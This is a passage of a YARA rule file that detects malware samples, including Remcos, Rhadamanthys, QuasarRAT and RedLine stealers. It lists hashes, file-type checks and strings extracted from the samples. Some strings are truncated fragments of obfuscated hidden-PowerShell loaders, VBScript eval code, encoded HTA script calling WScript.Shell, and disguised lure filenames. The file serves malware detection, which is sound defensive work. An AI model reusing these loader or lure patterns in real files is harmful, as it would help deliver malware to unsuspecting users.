      $s11 = "NZqLWiK2ZTekLfgIrcKsC1uTZuU+2petEBMipAzmd2bI/lGNk08Za16oAXLhqqTBy5Uj+z/Q2lry7koPk8E6vaaRP69hHngMeguGhtkky2V+UNhnwow2+BP2iqUFCced" ascii /* score: '16.00'*/
      $s12 = "7OL8n8CW3/rzUwPMeeanAFam6WDPkfW7tIowtKqF2Ij26PPdfydO9OTPASB2vdf9nZ41d2UOzUrtMNtGVitQbYp61ZDy2ZE/V/R8AJDFRQaiQxcMUGET6Cu44E5L+J65" ascii /* score: '16.00'*/
      $s13 = "7x0uV1xnrhB81qU9bjEq+9hMiWfVnAzaYiUHULN+xgt6vKxYKgSwbQbFakeUZ8q7e7369XTixFMAU/UnUF1c/hCZwrGE0tHDnBxRACG1NgpaS9UFg9CWh+hZR8YfiQy5" ascii /* score: '16.00'*/
      $s14 = "IECEW9iaGu88F+dweJ/kjaB8jfnmyWHtkspyNn4O7gGdcCrsPW9VRcUkCvhlxB/DDISrZuJ2kWbulskOJ9RxLTnV0vhlCEAxF0g0sr55h96qvyn5Y3cvJu7D/aamVy3g" ascii /* score: '16.00'*/
      $s15 = "JvUqTztNm2hRhxBtbB4FmSY6Sl7IbLiBlxvhCKlcqz7AOO0+0/Ibzd3Iol0nNOOydirC8jbzP7o8mKgvXILO9NvhnSMwxsUkHoxxD7pbWmIoLpJ+mbj33Pki8jtJ/GFb" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x2027 and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule PureLogsStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__9492cef4 {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_9492cef4.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9492cef42975b42262a1df4b080447f1765be773b7a121f7eacdb43b8756d7b0"
   strings:
      $s1 = "ProcessDecryptor" fullword ascii /* score: '22.00'*/
      $s2 = "Arrfxhqvykq.exe" fullword wide /* score: '22.00'*/
      $s3 = "m_DecryptorCommandName" fullword ascii /* score: '19.00'*/
      $s4 = "EncryptCommonDecryptor" fullword ascii /* score: '19.00'*/
      $s5 = "ExecuteDecorator" fullword ascii /* score: '18.00'*/
      $s6 = "EncryptGeneralDecryptor" fullword ascii /* score: '16.00'*/
      $s7 = "ModifyAdvancedExecutor" fullword ascii /* score: '16.00'*/
      $s8 = "EncryptConvertibleDecryptor" fullword ascii /* score: '16.00'*/
      $s9 = "EncryptDividedDecryptor" fullword ascii /* score: '16.00'*/
      $s10 = "EncryptSortedDecryptor" fullword ascii /* score: '16.00'*/
      $s11 = "EncryptExtendedDecryptor" fullword ascii /* score: '16.00'*/
      $s12 = "_PortableDecryptorElements" fullword ascii /* score: '14.00'*/
      $s13 = "DecryptPassiveDecryptor" fullword ascii /* score: '14.00'*/
      $s14 = "m_IdentifiableDecryptor" fullword ascii /* score: '14.00'*/
      $s15 = "m_DecryptorAuthorizer" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule Rhadamanthys_signature_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature).zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "08de42614464979e0394ebb11b50eb3023a349a71f63e283f73e48f6d30dd796"
   strings:
      $s1 = "micorsercisecxbit21r3.exe" fullword ascii /* score: '22.00'*/
      $s2 = "libpsl-5.dll" fullword ascii /* score: '20.00'*/
      $s3 = "libunistring-5.dll" fullword ascii /* score: '20.00'*/
      $s4 = "libidn2-0.dll" fullword ascii /* score: '20.00'*/
      $s5 = "libintl-8.dllPK" fullword ascii /* score: '16.00'*/
      $s6 = "UFRFJFZFz" fullword ascii /* base64 encoded string 'PTE$VE' */ /* score: '14.00'*/
      $s7 = "libiconv-2.dllPK" fullword ascii /* score: '13.00'*/
      $s8 = "libpsl-5.dllPK" fullword ascii /* score: '13.00'*/
      $s9 = "libidn2-0.dllPK" fullword ascii /* score: '13.00'*/
      $s10 = "libunistring-5.dllPK" fullword ascii /* score: '13.00'*/
      $s11 = "micorsercisecxbit21r3.exePK" fullword ascii /* score: '11.00'*/
      $s12 = "8Q0I0Y0M0" fullword ascii /* base64 encoded string 'CB4cC4' */ /* score: '11.00'*/
      $s13 = "vpQpIpipepKp{pGpOpop_" fullword ascii /* score: '10.00'*/
      $s14 = ">5%===7='=#=-" fullword ascii /* score: '9.00'*/ /* hex encoded string 'W' */
      $s15 = "\"43<+<;</" fullword ascii /* score: '9.00'*/ /* hex encoded string 'C' */
   condition:
      uint16(0) == 0x4b50 and filesize < 11000KB and
      8 of them
}

rule Quakbot_signature__57842fe8 {
   meta:
      description = "_subset_batch - file Quakbot(signature)_57842fe8.lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "57842fe8723ed6ebdf7fc17fc341909ad05a7a4feec8bdb5e062882da29fa1a8"
   strings:
      $s1 = "C:\\Program Files\\Windows Photo Viewer\\PhotoViewer.dll" fullword wide /* score: '26.00'*/
      $s2 = "6C:\\Program Files\\Windows Photo Viewer\\PhotoViewer.dll" fullword wide /* score: '26.00'*/
      $s3 = "demurest.cmd" fullword wide /* score: '15.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 8KB and
      all of them
}

rule QuasarRAT_signature__678fec19 {
   meta:
      description = "_subset_batch - file QuasarRAT(signature)_678fec19.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "678fec195529ac67002cf29197d43af393d9e1d27d42c29f1b9bc1635f1a2d00"
   strings:
      $x1 = ":: joOgw53MrRwgJ24GCvgqFcBm3NOy9r0vZVdZUUwp2Z9sVBGtoSvW0unLrpClA3LEoUYtf3GF6A4WWFpI3jS+BC8EIqv8efMJZDjQZh6kYMJNHW2rIG9PpiHwZ1Hvx" ascii /* score: '70.00'*/
      $s2 = "J2FF1cz94XNj3TfgbFvL00JahYwt5rLmkgi/hpaelr4P9S/LFLq/WUvkP2AlogINE/j92PO+A56ZJBMp6AtccOMdenj2yOzlWfLXmHGhr2yPuuinLD72MCiZN+/GJxn4" ascii /* score: '25.00'*/
      $s3 = "L8Er43YSYW3MDdJKUTKvB90zsOkh0niuemt7wLxRo5762/AeaytFu+pIpyuNB1/2pLbr4BwKlNm/91NKfB2NS3zfrZ770Ob1opk3QCBjHwA9iiF+Ai6ArwDUMpK7Kbi6" ascii /* score: '21.00'*/
      $s4 = "uflOgAJOCUEPzubrQ/qXysxWHvmfK4F9z/g01AFUDQiKsP20H6l5rVdBSnUSaMx9tP36gD+AygLg6uRa8SP32OziNt41D/eoXEye80GTG2P1ebuY7Lv95IliB3AH0PLn" ascii /* score: '21.00'*/
      $s5 = "zgaNVjwj/VyVZiq4xjPMw/DIq54zED1F4X1gg20qvjwtCOnKWy9ljaGs7IRCr12r1Avvk5rDO3lzx6EyEEAZD8tQU5Yy34G/CIdCeDacIMBh+laMP0aAU5SMPA5+jOPp" ascii /* score: '21.00'*/
      $s6 = "gJq5WkK2W5IJAcDDY1eIfHIgxlq+ajAYaVLgkKRBg8TnE3SMCidwDi4QOg4SJiDuMpUlEPSXT3R8hZscby6kzH7ft8rWxt7UPJR8u9SFDBu1qrvUzWA4RWFuagR2PCVI" ascii /* score: '21.00'*/
      $s7 = "dhSpyYLhg3/4uloGawrEgs71ZRJDOHvNxg6lVZFmjTDf50RLDRh7cZIkqdY2yuQ1fFN4nMuo4DD8AYI1Ymx8lbbZWTM2ZzDJbiQQ7NDrz3LJ2YeF+pr1JFasV3Ov1UXo" ascii /* score: '21.00'*/
      $s8 = "Grrg4uKtsofJa/LOgid0uKHJFxbDEuwTtb5V75vArrgetKwLOJsvk/zGBf5P5mKoRl21CU8ZxmYY82L5XUMB/lm9NXgpv2PJPKon8QZdX0YVKOwyuukrZ73CQrA33v86" ascii /* score: '21.00'*/
      $s9 = "HhTxriE6SPy0b9t9v6a7AQ2O1TgHC/iNZ6P0PjLpMs08Q5YGLbsjZMGNDylgjinGnJQVgYfV8+rKSMMnxVKEDgKU6H9cE5fqP76StaNgmxCX/Gdx5x17hUI2KbtXDQn2" ascii /* score: '20.00'*/
      $s10 = "SGZw/vOf3c4UY+Mw6k97ZcosGWA87WYrOCw67kpW41BABnSvlQduv62ux8xHctfepLFVuigOMklE8i6Y/4Fp7UINITFv1IJbRa4Kiu34TS8wjpbPDPZsf+d7yExeCdjK" ascii /* score: '19.00'*/
      $s11 = "EWx1S3SHozQ9JM8C6U9Sly7UFrEff+FTrB1AIdv26dSjr5KfIuILqFXNL4KK7WZdylCMdB86PGeT2gB18BAONixHxXFae9Xl8Y3xP+F6sTdIuF9FIgpofLezqhQ7mIj4" ascii /* score: '19.00'*/
      $s12 = "cjlQp9y9vMDNFkkJvVNMV0UoLvYdCR64UJqQ+U1m4fO9mkEYe8Dc4QFAcSBeGuksFATkcE7HDVZjbby0q6aykS/GmXVQkzMNuAQ8SJHISbmhcpzw/YfxOLQP7snbfji2" ascii /* score: '19.00'*/
      $s13 = "9EYebtLoJJ0iV0/xH3OXwpy+UQH0wdSCjv7kNq22eBejXjGSVhhPpcgmBS6cTUTNKdDV+oe6EKNRTetrBCiHvM0OyCeULT8HR+WH864i7BzcmDlph3uhiVAmArmbNjsB" ascii /* score: '19.00'*/
      $s14 = "i5X9qbuZvaCQ1zD4eMnta4b14DmEjhzzFz1hEt8qIkw/C1f4ieIw1PX2fDhJjaw3DOSwI28yBsfaNtMPGejIMMK3ISKKhUT62GmMFIRC5j31C58r9rYZQD/0WoCcdQhW" ascii /* score: '19.00'*/
      $s15 = "q/APbi7c6UxyhFEXZAQJQj7x/7xpBwND4dpAAdXjkzYuFtpmr+wur5JTSPh5htRni7l6vPRgBFLbF105Fq0lNwVg/ItmprFyeLJ2kXKtzIruStetY2DkIcdoDQXUFtaY" ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x2540 and filesize < 7000KB and
      1 of ($x*) and 4 of them
}

rule Ratty_signature_ {
   meta:
      description = "_subset_batch - file Ratty(signature).jar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a4db33894c6ed7b61910488d620ed5108270dde04606445950d994b260ac592d"
   strings:
      $s1 = "com/sun/jna/win32-aarch64/jnidispatch.dll" fullword ascii /* score: '23.00'*/
      $s2 = "com/sun/jna/win32-x86/jnidispatch.dll" fullword ascii /* score: '23.00'*/
      $s3 = "com/sun/jna/platform/win32/WinNT$SYSTEM_LOGICAL_PROCESSOR_INFORMATION$AnonymousUnionPayload.classPK" fullword ascii /* score: '23.00'*/
      $s4 = "com/sun/jna/win32-x86-64/jnidispatch.dll" fullword ascii /* score: '23.00'*/
      $s5 = "com/sun/jna/platform/win32/WinNT$SYSTEM_LOGICAL_PROCESSOR_INFORMATION$AnonymousUnionPayload.class" fullword ascii /* score: '23.00'*/
      $s6 = "org/sqlite/native/Windows/x86/sqlitejdbc.dll" fullword ascii /* score: '20.00'*/
      $s7 = "org/sqlite/native/Windows/x86_64/sqlitejdbc.dll" fullword ascii /* score: '20.00'*/
      $s8 = "com/sun/jna/platform/win32/WinNT$TOKEN_ELEVATION.class" fullword ascii /* score: '18.00'*/
      $s9 = "com/sun/jna/platform/win32/WinNT$TOKEN_ELEVATION.classPK" fullword ascii /* score: '18.00'*/
      $s10 = "com/sun/jna/platform/win32/DdemlUtil$ExecuteHandler.classPK" fullword ascii /* score: '17.00'*/
      $s11 = "com/proj/client/packet/packets/filemananger/PacketExecuteFile.classPK" fullword ascii /* score: '17.00'*/
      $s12 = "com/sun/jna/platform/win32/DdemlUtil$ExecuteHandler.class" fullword ascii /* score: '17.00'*/
      $s13 = "com/proj/client/packet/packets/filemananger/PacketExecuteFile.class" fullword ascii /* score: '17.00'*/
      $s14 = "com/proj/client/packet/packets/surveillance/PacketLiveKeylogger.classPK" fullword ascii /* score: '16.00'*/
      $s15 = "com/sun/jna/platform/win32/COM/tlb/imp/TlbPropertyGetStub.templateSPPP" fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 16000KB and
      8 of them
}

rule Rhadamanthys_signature__5ae8da8d195503ea36a6c31c6043ecb8_imphash__05c62e20 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_5ae8da8d195503ea36a6c31c6043ecb8(imphash)_05c62e20.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "05c62e20038396bab316b32a3b0dbe80aae401ea699f8642f215d9e74556eaa7"
   strings:
      $s1 = "Sandbox.exe" fullword wide /* score: '22.00'*/
      $s2 = "ZXZXYXZZYXX" fullword ascii /* base64 encoded string 'evWavYau' */ /* score: '16.50'*/
      $s3 = "ZZZXXX" fullword ascii /* reversed goodware string 'XXXZZZ' */ /* score: '13.50'*/
      $s4 = "ZYYYXX" fullword ascii /* reversed goodware string 'XXYYYZ' */ /* score: '13.50'*/
      $s5 = "Nzkw7l:\"" fullword ascii /* score: '10.00'*/
      $s6 = "ZYYYYXZ" fullword ascii /* score: '9.50'*/
      $s7 = "YYYYYXYX" fullword ascii /* score: '9.50'*/
      $s8 = "XYYYYYZX" fullword ascii /* score: '9.50'*/
      $s9 = "YXXZXYYYYY" fullword ascii /* score: '9.50'*/
      $s10 = "YYYYXYZXXZ" fullword ascii /* score: '9.50'*/
      $s11 = "ZYYYYYZX" fullword ascii /* score: '9.50'*/
      $s12 = "* '&f+" fullword ascii /* score: '9.00'*/
      $s13 = "\"qiiFtpuj" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 21000KB and
      8 of them
}

rule Rhadamanthys_signature__5ae8da8d195503ea36a6c31c6043ecb8_imphash__31faa717 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_5ae8da8d195503ea36a6c31c6043ecb8(imphash)_31faa717.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "31faa7175a8e57fa345c395bf0490d3437b8f2117b193948a7f3789d3fc9ef7e"
   strings:
      $s1 = "Sandbox.exe" fullword wide /* score: '22.00'*/
      $s2 = "XYYYYY" fullword ascii /* reversed goodware string 'YYYYYX' */ /* score: '16.50'*/
      $s3 = "XYZZZY" fullword ascii /* reversed goodware string 'YZZZYX' */ /* score: '13.50'*/
      $s4 = "ZYXXXX" fullword ascii /* reversed goodware string 'XXXXYZ' */ /* score: '13.50'*/
      $s5 = "ZZZYZX" fullword ascii /* reversed goodware string 'XZYZZZ' */ /* score: '13.50'*/
      $s6 = "Pfrd8.rms" fullword ascii /* score: '10.00'*/
      $s7 = "XYXXYYYYY" fullword ascii /* score: '9.50'*/
      $s8 = "YYYYZYXZXXY" fullword ascii /* score: '9.50'*/
      $s9 = "YYYYXZX" fullword ascii /* score: '9.50'*/
      $s10 = "XYYYYXZX" fullword ascii /* score: '9.50'*/
      $s11 = "ZYYYYYX" fullword ascii /* score: '9.50'*/
      $s12 = "XYYYYXZ" fullword ascii /* score: '9.50'*/
      $s13 = "ZYZXYYYYZZ" fullword ascii /* score: '9.50'*/
      $s14 = "sEYEvFc" fullword ascii /* score: '9.00'*/
      $s15 = "igdelxt" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 20000KB and
      8 of them
}

rule Ratty_signature__2 {
   meta:
      description = "_subset_batch - file Ratty(signature).vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0c83413d7f119b5d02f2749746229bb1a49b40ade4b4245eda247e8115bb18b9"
   strings:
      $s1 = "Eval Execute(lfox)" fullword ascii /* score: '22.00'*/
      $s2 = "ddbx.Add \"Os\", 233" fullword ascii /* score: '10.00'*/
      $s3 = "ddbx.Add \"Qk\", 111" fullword ascii /* score: '10.00'*/
      $s4 = "ddbx.Add \"io\", 33" fullword ascii /* score: '10.00'*/
      $s5 = "Set ddbx = CreateObject(\"Scripting.Dictionary\")" fullword ascii /* score: '10.00'*/
      $s6 = "ddbx.Add \"Mw\", 114" fullword ascii /* score: '10.00'*/
      $s7 = "ddbx.Add \"Sm\", 109" fullword ascii /* score: '10.00'*/
      $s8 = "ddbx.Add \"HA\", 46" fullword ascii /* score: '10.00'*/
      $s9 = "ddbx.Add \"DD\", 97" fullword ascii /* score: '10.00'*/
      $s10 = "ddbx.Add \"Gk\", 118" fullword ascii /* score: '10.00'*/
      $s11 = "ddbx.Add \"Rp\", 58" fullword ascii /* score: '10.00'*/
      $s12 = "ddbx.Add \"Ux\", 73" fullword ascii /* score: '10.00'*/
      $s13 = "ddbx.Add \"Kd\", 105" fullword ascii /* score: '10.00'*/
      $s14 = "ddbx.Add \"rf\", 83" fullword ascii /* score: '10.00'*/
      $s15 = "ddbx.Add \"Jh\", 32" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x6944 and filesize < 100KB and
      8 of them
}

rule RedLineStealer_signature_ {
   meta:
      description = "_subset_batch - file RedLineStealer(signature).rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e79037d299e1e7f1c0168861557da875e5506e2b0771920a9f1e6f6557b16b3d"
   strings:
      $s1 = "ordini_2025.1376.exe" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      all of them
}

rule RemcosRAT_signature__6 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature).7z"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e13af410e6fca93d4650ef9fb67eb35da356040841aff69c563e3541f757897b"
   strings:
      $s1 = "=Vessel Specifications_pdf.exe" fullword wide /* score: '15.00'*/
      $s2 = "lHVyX.Oky" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x7a37 and filesize < 3000KB and
      all of them
}

rule RemcosRAT_signature__89978e9b {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_89978e9b.7z"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "89978e9be45ecd5950eb1b27765ec3f94e7a0bd0c4a57175d8efc50968b1e09f"
   strings:
      $s1 = ";DHL AWB 50 No3354087_pdf.exe" fullword wide /* score: '16.00'*/
      $s2 = "lHVyX.Oky" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x7a37 and filesize < 3000KB and
      all of them
}

rule RemcosRAT_signature__7 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature).bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "473351bdc8c28259e3c0eacf0f85e83067c5e1b2b612b65bd196b9a6fc9dcad2"
   strings:
      $x1 = "powershell.exe -windowstyle hidden \"Get-DiskSNV;function Misorganiz ($shagpibenp){ $unspang=3;do {$radiogra193+=$shagpibenp[$un" ascii /* score: '44.00'*/
      $x2 = "powershell.exe -windowstyle hidden \"Get-DiskSNV;function Misorganiz ($shagpibenp){ $unspang=3;do {$radiogra193+=$shagpibenp[$un" ascii /* score: '32.00'*/
      $s3 = "GaGGGTGG.hGGG GG $GGGrGGGiGGGGGGGSGGGdGGGaGGGl GGE G rG Ge,GG)');while (!$kontoe) {Vinden (Misorganiz '---$- -g --l---o---b---a-" ascii /* score: '19.00'*/
      $s4 = "ganiz '!!!U!!!s!!!E !!r !!-!!!a!!!g!!!E!!!n!!!T';$tarascemol=Misorganiz 'DD hDDDtDDDtDD.p DD:DDD/DD /DDDsDDDhD,DiDDDnDDDoDDDbDDD" ascii /* score: '13.00'*/
      $s5 = "--l--,: --P-.-o .-r---t,--u --n - i --d---a- -= - $ --s---t --o---c---c---a') ;Vinden $endship123;Vinden (Misorganiz ']]][]]]t]," ascii /* score: '12.00'*/
      $s6 = " eo eeB ,eaeeeLe.e: eePeeeF e,AeeeF ,efee,Ieee= eeNeeee e,Weee-eeeo eeB eej eeeeeece eteee eeese eYeeeSeeeteeeee eM .e. .e$ eere" ascii /* score: '9.00'*/
      $s7 = "g///l///o// b //A///L //:///e///d///g//,e/./W///i///s///E///a///+/,/+ /,%%  /$ //t// A///l///E/,/.///c/ /O///U.//n///T') ;$taras" ascii /* score: '9.00'*/
      $s8 = "GHHHsHH D HHAHHHLHHHEHHHRHH EHHH)') ;Vinden (Misorganiz '///$///G///l//,O///B //A/ /L.//: //l///i// M///m //A// r///Y,//=///$ //" ascii /* score: '8.00'*/
      $s9 = "(n(((E(((R(((a(( L(((i( (E  (,((($.((l(((E(((M(((F(( l(((d(((i ((g.((s (()');Vinden $tydeli;#Outey Preobliga Seriat Arabersiex ;" ascii /* score: '8.00'*/
      $s10 = " SSSSS eSSSRSS,vSS ISSSCSSSeSSSpSSSoSSSISSSNSSSt S mSSSaS SNSSSA SSGSSSe SSRSSS]SSS: SS:SSSsSSSESSSCSSSuSS rSS.i S T .SySSSP SSR" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6f70 and filesize < 10KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__8 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature).cmd"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ee39963069861690f9b546ee282b9c4d5577a042f4b76dbe8656610eeb36045f"
   strings:
      $x1 = "powershell.exe -windowstyle hidden \"Get-DiskSNV;function Sarmaticko ($samme){ $tassahdemo74=3;do {$mini+=$samme[$tassahdemo74];" ascii /* score: '34.00'*/
      $x2 = "powershell.exe -windowstyle hidden \"Get-DiskSNV;function Sarmaticko ($samme){ $tassahdemo74=3;do {$mini+=$samme[$tassahdemo74];" ascii /* score: '32.00'*/
      $s3 = "0060004000" ascii /* score: '17.00'*/ /* hex encoded string '`@' */
      $s4 = "2224222022202220" ascii /* score: '17.00'*/ /* hex encoded string '"$" " " ' */
      $s5 = " {Ishc (Sarmaticko ' --$ --g.--l---o---b-- a---l---:  -F --j--,e---r--,t-- e- -d---e- -e --= - $ .-s.--k --y---g --g') ;Ishc $kv" ascii /* score: '16.00'*/
      $s6 = "Kp KKeKKKxKKKfKKKu.KKr.KKlKKKlKKKc KK.KK tKK,oKKKp KK/KKKTK KuKK,r  KaKKKn KKi K t  KeKKKnKKKi KK.K KdKK sKKKp';$purungsoeg=Sarm" ascii /* score: '10.00'*/
      $s7 = "minusexcep=Sarmaticko ' QQMQQQoQ QzQQQiQQQl QQlQQQaQ.Q/';$logereanor=Sarmaticko ' VVTVVVl VVsVVV1VVV2';$nean=' qq[qqqNq qE,qqTqq" ascii /* score: '9.00'*/
      $s8 = "nVVVcVVVU,VV)');Ishc $auxotrophy;#Tria Fors Husede Fljlsja embeds SIex Aerome Partikula ;\"" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6f70 and filesize < 10KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__cf30df80 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_cf30df80.rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "cf30df80903227159300f4846c942b598e34fc4d42874120a4e130a8cfb852dc"
   strings:
      $s1 = "5deutschebnksrcswiftmt199058058625200909[780-0742].scr" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 3000KB and
      all of them
}

rule RemcosRAT_signature__9 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature).gz"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "73219e2018a09bdfd127cb991ea920cf3c65bd78e909d2617ed15c95f9c7bd55"
   strings:
      $s1 = "Surgos megrendeles 2025.09.09.bat" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x8b1f and filesize < 6KB and
      all of them
}

rule RemcosRAT_signature__b3a7a0ff {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_b3a7a0ff.gz"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b3a7a0ffe3f97e4f8b334096c5fa8e3a60873f459a61fbde1edd5196ce7fc083"
   strings:
      $s1 = "FakturE Schenker 12-19442025 I 12-18782025.bat" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x8b1f and filesize < 6KB and
      all of them
}

rule RemcosRAT_signature__10 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature).hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3509fb04e772680941a132634df2000b73406c6aa34effaad055904237337fe5"
   strings:
      $x1 = "document.write(unescape(\"%3Cscript%3E%0A%3C%21--%0Adocument.write%28unescape%28%22%253Chtml%253E%250A%253Chead%253E%250A%253Cti" ascii /* score: '41.00'*/
      $s2 = "//%2520http%253A//ixti.net/development/javascript/2011/11/11/MacDiarmid-encodedecode-of-utf8-in-browser-with-js.html%250A%2520%2" ascii /* score: '23.00'*/
      $s3 = "22WScript.Shell%2522%2529%253B%250A%2520%2520%2520%2520%257D%2529%2528%2529%253B%250A%250A%2520%2520%2520%2520var%2520reinfect%2" ascii /* score: '20.00'*/
      $s4 = "0new%2520AES%2528key%2529%253B%250A%2520%2520%2520%2520%257D%250A%250A%2520%2520%2520%2520ModeOfOperationECB.prototype.encrypt%2" ascii /* score: '17.00'*/
      $s5 = "528key%2529%253B%250A%2520%2520%2520%2520%257D%250A%250A%2520%2520%2520%2520ModeOfOperationCFB.prototype.encrypt%2520%253D%2520f" ascii /* score: '17.00'*/
      $s6 = "ic%250A%2520%2520%2520%2520ModeOfOperationOFB.prototype.decrypt%2520%253D%2520ModeOfOperationOFB.prototype.encrypt%253B%250A%250" ascii /* score: '16.00'*/
      $s7 = "0%2520%2520%2520%2520%2520return%2520encrypted%253B%250A%2520%2520%2520%2520%257D%250A%250A%2520%2520%2520%2520ModeOfOperationCF" ascii /* score: '14.00'*/
      $s8 = "20%2520%2520%2520%2520sourceBuffer.copy%2528targetBuffer%252C%2520targetStart%252C%2520sourceStart%252C%2520sourceEnd%2529%253B%" ascii /* score: '14.00'*/
      $s9 = "getBuffer%252C%2520targetStart%252C%2520sourceStart%252C%2520sourceEnd%2529%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%25" ascii /* score: '14.00'*/
      $s10 = "20%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520if%2520%2528targetStart%2520%253D%253D%2520null%2529%2520%257B%2520targ" ascii /* score: '14.00'*/
      $s11 = "pe.encrypt%253B%250A%250A%250A%2520%2520%2520%2520//%2520The%2520basic%2520modes%2520of%2520operation%2520as%2520a%2520map%250A%" ascii /* score: '14.00'*/
      $s12 = "ction%2528sourceBuffer%252C%2520targetBuffer%252C%2520targetStart%252C%2520sourceStart%252C%2520sourceEnd%2529%2520%257B%250A%25" ascii /* score: '14.00'*/
      $s13 = "0%2520%2520%2520%2520targetBuffer%255BtargetStart++%255D%2520%253D%2520sourceBuffer%255Bi%255D%253B%250A%2520%2520%2520%2520%252" ascii /* score: '14.00'*/
      $s14 = "50A%2520%2520%2520%2520ModeOfOperationOFB.prototype.encrypt%2520%253D%2520function%2528plaintext%2529%2520%257B%250A%2520%2520%2" ascii /* score: '14.00'*/
      $s15 = "257D%250A%250A%2520%2520%2520%2520ModeOfOperationCTR.prototype.encrypt%2520%253D%2520function%2528plaintext%2529%2520%257B%250A%" ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x733c and filesize < 800KB and
      1 of ($x*) and 4 of them
}

rule RemcosRAT_signature__1d412c6f {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_1d412c6f.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1d412c6fef4d9a142d1c1910bfb91d00ea62ce86dab0f6a473423601b6042464"
   strings:
      $x1 = "document.write(unescape(\"%3Cscript%3E%0A%3C%21--%0Adocument.write%28unescape%28%22%253Chtml%253E%250A%253Chead%253E%250A%253Cti" ascii /* score: '41.00'*/
      $s2 = "%2520//%2520http%253A//ixti.net/development/javascript/2011/11/11/zucchetto-encodedecode-of-utf8-in-browser-with-js.html%250A%25" ascii /* score: '23.00'*/
      $s3 = "520%2520ModeOfOperationCTR.prototype.decrypt%2520%253D%2520ModeOfOperationCTR.prototype.encrypt%253B%250A%250A%250A%2520%2520%25" ascii /* score: '16.00'*/
      $s4 = "FB.prototype.decrypt%2520%253D%2520ModeOfOperationOFB.prototype.encrypt%253B%250A%250A%250A%2520%2520%2520%2520/**%250A%2520%252" ascii /* score: '16.00'*/
      $s5 = "20SYSMENU%253D%2522no%2522%250A%2520%2520WINDOWSTATE%253D%2522minimize%2522%253E%250A%253C/head%253E%250A%250A%253Cscript%2520la" ascii /* score: '15.00'*/
      $s6 = "22WScript.Shell%2522%2529%253B%250A%2520%2520%2520%2520%257D%2529%2528%2529%253B%250A%250A%2520%2520%2520%2520var%2520swampiest%" ascii /* score: '15.00'*/
      $s7 = "20%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520if%2520%2528targetStart%2520%253D%253D%2520null%2529%2520%257B%2520targ" ascii /* score: '14.00'*/
      $s8 = "ction%2528sourceBuffer%252C%2520targetBuffer%252C%2520targetStart%252C%2520sourceStart%252C%2520sourceEnd%2529%2520%257B%250A%25" ascii /* score: '14.00'*/
      $s9 = "0%2520%2520%2520%2520targetBuffer%255BtargetStart++%255D%2520%253D%2520sourceBuffer%255Bi%255D%253B%250A%2520%2520%2520%2520%252" ascii /* score: '14.00'*/
      $s10 = "document.write(unescape(\"%3Cscript%3E%0A%3C%21--%0Adocument.write%28unescape%28%22%253Chtml%253E%250A%253Chead%253E%250A%253Cti" ascii /* score: '14.00'*/
